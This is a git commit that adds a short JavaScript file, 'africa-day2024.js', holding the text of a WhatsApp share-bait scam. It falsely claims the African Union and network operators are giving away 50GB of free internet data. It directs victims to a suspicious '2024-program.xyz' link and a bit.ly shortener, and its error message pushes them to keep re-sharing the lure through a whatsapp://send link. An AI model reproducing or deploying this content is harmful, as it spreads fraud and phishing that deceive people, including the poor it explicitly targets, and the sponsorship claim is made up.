280b91b2f8f7bbda5e95e612dbcc8e74a080f8eb
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-06 00:19:47 -0700

    Update and rename mtnghana.js to africa-day2024.js

---
+++ africa-day2024.js
@@ -0,0 +1,7 @@
+ var text1 = "*AFRICA DAY CELEBRATION 2024*%0A%0A_African Union Commission in partnership with all network operators to celebrate 2024 Africa Day by giving out 50GB Free internet Data_%0A%0A*Sponsored by: African Union*%0A%0A_Click Here to get yours_👇%0Ahttps://2024-program.xyz/africa-day",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
